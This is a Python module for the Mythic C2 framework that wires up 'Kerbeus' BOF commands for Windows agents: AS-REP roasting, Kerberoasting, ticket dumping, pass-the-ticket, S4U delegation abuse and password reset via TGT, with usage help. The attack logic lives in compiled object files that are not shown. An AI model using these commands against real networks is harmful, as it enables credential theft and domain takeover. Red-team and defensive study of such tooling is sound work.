from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import logging
import json

from .Utils.u import *

class KerbeusBaseCommand(CommandBase):
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )
    
    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        bof_name = self.cmd.replace("krb-", "")
        content: bytes = await get_content_by_name(f"{bof_name}.x64.o", task.Task.ID)
        
        input_str = task.args.get_arg("input") or ""
        
        display_params = input_str.replace("/", " /")  # Add space before slashes for better readability
        
        bof_args = [
            {"type": "char", "value": input_str}
        ]
        
        task.args.remove_arg("input")
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_id", 0, ParameterType.Number)
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName="exec-bof",
            TokenID=task.Task.TokenID,
            DisplayParams=display_params,
        )
  
    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)

# AS-REP Roasting
class KrbAsreproastingArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for AS-REP roasting",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbAsreproastingCommand(KerbeusBaseCommand):
    cmd = "krb-asreproasting"
    needs_admin = False
    help_cmd = "krb-asreproasting /user:USER [/dc:DC] [/domain:DOMAIN] [/aes]"
    description = "Perform AS-REP roasting to get crackable hashes for users with Kerberos pre-authentication disabled"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbAsreproastingArguments

# TGT Request
class KrbAsktgtArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for TGT request",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbAsktgtCommand(KerbeusBaseCommand):
    cmd = "krb-asktgt"
    needs_admin = False
    help_cmd = """
    krb-asktgt /user:USER /password:PASSWORD [/domain:DOMAIN] [/dc:DC] [/enctype:{rc4|aes256}] [/ptt] [/nopac] [/opsec]
    krb-asktgt /user:USER /aes256:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac] [/opsec]
    krb-asktgt /user:USER /rc4:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac]
    krb-asktgt /user:USER /nopreauth [/domain:DOMAIN] [/dc:DC] [/ptt]
    """
    description = "Request a Kerberos Ticket Granting Ticket (TGT)"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbAsktgtArguments

# TGS Request
class KrbAsktgsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for TGS request",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbAsktgsCommand(KerbeusBaseCommand):
    cmd = "krb-asktgs"
    needs_admin = False
    help_cmd = "krb-asktgs /ticket:BASE64 /service:SPN1,SPN2,... [/domain:DOMAIN] [/dc:DC] [/tgs:BASE64] [/targetdomain:DOMAIN] [/targetuser:USER] [/enctype:{rc4|aes256}] [/ptt] [/keylist] [/u2u] [/opsec]"
    description = "Request a Kerberos Ticket Granting Service (TGS) ticket"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbAsktgsArguments

# Password Change
class KrbChangepwArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for password change",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbChangepwCommand(KerbeusBaseCommand):
    cmd = "krb-changepw"
    needs_admin = False
    help_cmd = "krb-changepw /ticket:BASE64 /new:PASSWORD [/dc:DC] [/targetuser:USER] [/targetdomain:DOMAIN]"
    description = "Reset a user's password using a supplied TGT"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbChangepwArguments

# Ticket Describe
class KrbDescribeArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for ticket description",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbDescribeCommand(KerbeusBaseCommand):
    cmd = "krb-describe"
    needs_admin = False
    help_cmd = "krb-describe /ticket:BASE64"
    description = "Parse and describe a Kerberos ticket"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbDescribeArguments

# Ticket Dump
class KrbDumpArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for ticket dump",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbDumpCommand(KerbeusBaseCommand):
    cmd = "krb-dump"
    needs_admin = False
    help_cmd = "krb-dump [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]"
    description = "Dump Kerberos tickets from memory"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbDumpArguments

# Hash Calculation
class KrbHashArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for hash calculation",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbHashCommand(KerbeusBaseCommand):
    cmd = "krb-hash"
    needs_admin = False
    help_cmd = "krb-hash /password:PASSWORD [/user:USER] [/domain:DOMAIN]"
    description = "Calculate Kerberos encryption keys from password"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbHashArguments

# Kerberoasting
class KrbKerberoastingArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for Kerberoasting",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbKerberoastingCommand(KerbeusBaseCommand):
    cmd = "krb-kerberoasting"
    needs_admin = False
    help_cmd = """
    krb-kerberoasting /spn:SPN [/nopreauth:USER] [/dc:DC] [/domain:DOMAIN]
    krb-kerberoasting /spn:SPN /ticket:BASE64 [/dc:DC]
    """
    description = "Perform Kerberoasting to get crackable service account hashes"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbKerberoastingArguments

# Ticket List
class KrbKlistArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for ticket listing",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbKlistCommand(KerbeusBaseCommand):
    cmd = "krb-klist"
    needs_admin = False
    help_cmd = "krb-klist [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]"
    description = "List Kerberos tickets in memory"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbKlistArguments

# Pass-the-Ticket
class KrbPttArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for pass-the-ticket",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbPttCommand(KerbeusBaseCommand):
    cmd = "krb-ptt"
    needs_admin = False
    help_cmd = "krb-ptt /ticket:BASE64 [/luid:LOGONID]"
    description = "Submit a Kerberos ticket to the current logon session"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbPttArguments

# Ticket Purge
class KrbPurgeArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for ticket purge",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbPurgeCommand(KerbeusBaseCommand):
    cmd = "krb-purge"
    needs_admin = False
    help_cmd = "krb-purge [/luid:LOGONID]"
    description = "Purge Kerberos tickets from memory"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbPurgeArguments

# Ticket Renewal
class KrbRenewArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for ticket renewal",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbRenewCommand(KerbeusBaseCommand):
    cmd = "krb-renew"
    needs_admin = False
    help_cmd = "krb-renew /ticket:BASE64 [/dc:DC] [/ptt]"
    description = "Renew a Kerberos TGT"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbRenewArguments

# S4U Delegation
class KrbS4uArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for S4U delegation",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbS4uCommand(KerbeusBaseCommand):
    cmd = "krb-s4u"
    needs_admin = False
    help_cmd = "krb-s4u /ticket:BASE64 /service:SPN {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/ptt] [/nopac] [/opsec] [/self]"
    description = "Perform S4U constrained delegation abuse"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbS4uArguments

# Cross Domain S4U
class KrbCrossS4uArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for cross domain S4U",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbCrossS4uCommand(KerbeusBaseCommand):
    cmd = "krb-cross_s4u"
    needs_admin = False
    help_cmd = "krb-cross_s4u /ticket:BASE64 /service:SPN /targetdomain:DOMAIN /targetdc:DC {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/nopac] [/self]"
    description = "Perform S4U constrained delegation abuse across domains"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbCrossS4uArguments

# TGT Delegation
class KrbTgtdelegArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for TGT delegation",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbTgtdelegCommand(KerbeusBaseCommand):
    cmd = "krb-tgtdeleg"
    needs_admin = False
    help_cmd = "krb-tgtdeleg [/target:SPN]"
    description = "Retrieve a usable TGT for the current user without elevation by abusing the Kerberos GSS-API"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbTgtdelegArguments

# Ticket Triage
class KrbTriageArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="input",
                cli_name="input",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments for ticket triage",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("input", self.command_line)

class KrbTriageCommand(KerbeusBaseCommand):
    cmd = "krb-triage"
    needs_admin = False
    help_cmd = "krb-triage [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]"
    description = "List Kerberos tickets in table format"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    argument_class = KrbTriageArguments

# Help Command
class KerbeusHelpCommand(CommandBase):
    cmd = "kerbeus"
    needs_admin = False
    help_cmd = "kerbeus"
    description = "Show Kerbeus BOF help menu"
    version = 1
    author = "@Oblivion"
    browser_script = browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        help_text = """
Kerbeus BOF  help:

Ticket requests and renewals:

    Retrieve a TGT
        krb-asktgt /user:USER /password:PASSWORD [/domain:DOMAIN] [/dc:DC] [/enctype:{rc4|aes256}] [/ptt] [/nopac] [/opsec]
        krb-asktgt /user:USER /aes256:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac] [/opsec]
        krb-asktgt /user:USER /rc4:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac]
        krb-asktgt /user:USER /nopreauth [/domain:DOMAIN] [/dc:DC] [/ptt]

    Retrieve a TGS
        krb-asktgs /ticket:BASE64 /service:SPN1,SPN2,... [/domain:DOMAIN] [/dc:DC] [/tgs:BASE64] [/targetdomain:DOMAIN] [/targetuser:USER] [/enctype:{rc4|aes256}] [/ptt] [/keylist] [/u2u] [/opsec]

    Renew a TGT
        krb-renew /ticket:BASE64 [/dc:DC] [/ptt]

Constrained delegation abuse:

    Perform S4U constrained delegation abuse:
        krb-s4u /ticket:BASE64 /service:SPN {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/ptt] [/nopac] [/opsec] [/self]

    Perform S4U constrained delegation abuse across domains:
        krb-cross_s4u /ticket:BASE64 /service:SPN /targetdomain:DOMAIN /targetdc:DC {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/nopac] [/self]

Ticket management:

    Submit a TGT
        krb-ptt /ticket:BASE64 [/luid:LOGONID]

    Purge tickets
        krb-purge [/luid:LOGONID]

    Parse and describe a ticket
        krb-describe /ticket:BASE64

    Triage tickets
        krb-triage [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]

    List tickets
        krb-klist [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]

    Dump tickets
        krb-dump [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]

    Retrieve a usable TGT for the current user without elevation by abusing the Kerberos GSS-API
        krb-tgtdeleg [/target:SPN]

Roasting:

    Perform Kerberoasting:
        krb-kerberoasting /spn:SPN [/nopreauth:USER] [/dc:DC] [/domain:DOMAIN]
        krb-kerberoasting /spn:SPN /ticket:BASE64 [/dc:DC]

    Perform AS-REP roasting:
        krb-asreproasting /user:USER [/dc:DC] [/domain:DOMAIN] [/aes]

Miscellaneous:

    Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1 hashes:
        krb-hash /password:PASSWORD [/user:USER] [/domain:DOMAIN]

    Reset a user's password from a supplied TGT
        krb-changepw /ticket:BASE64 /new:PASSWORD [/dc:DC] [/targetuser:USER] [/targetdomain:DOMAIN]
        """
        
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=task.Task.ID,
            Response=help_text
        ))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            Completed=True
        )
  
    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)